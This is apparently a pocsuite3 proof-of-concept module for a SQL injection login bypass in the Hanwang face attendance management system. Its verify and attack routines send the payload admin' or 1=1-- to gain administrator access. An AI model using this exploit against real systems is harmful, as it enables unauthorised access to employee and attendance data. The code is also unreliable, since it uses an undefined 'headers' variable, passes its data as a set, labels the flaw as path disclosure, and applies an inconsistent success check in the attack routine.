import re, base64
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text

class DemoPOC(POCBase):
    vulID = '12'  
    author = ['']
    name = '汉王人脸考勤管理系统 Check SQL注入漏洞'
    desc = '''汉王人脸考勤管理系统存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。
    '''
    appPowerLink = '汉王'
    appName = '汉王人脸考勤管理系统'
    appVersion = '未知版本'
    samples = []
    install_requires = ['']
    vulType = VUL_TYPE.PATH_DISCLOSURE
    category = POC_CATEGORY.EXPLOITS.WEBAPP


    def _verify(self):
        result = {}
        url = self.url 
        data = {
        "strName=admin'+or+1%3D1--&strPwd=aaaaa"
        }
        try:
            r = requests.post(url, headers=headers, data=data, timeout=5)
            if r.status_code == 200 and "（欢迎管理员：admin）" in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
        except:
            pass

        return self.parse_output(result)
    
    def _attack(self):
        result = {}
        url = self.url 
        data = {
        "strName=admin'+or+1%3D1--&strPwd=aaaaa"
        }
        try:
            r = requests.post(url, headers=headers, data=data, timeout=5)
            if r.status_code == 200 and "ok" in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
        except:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)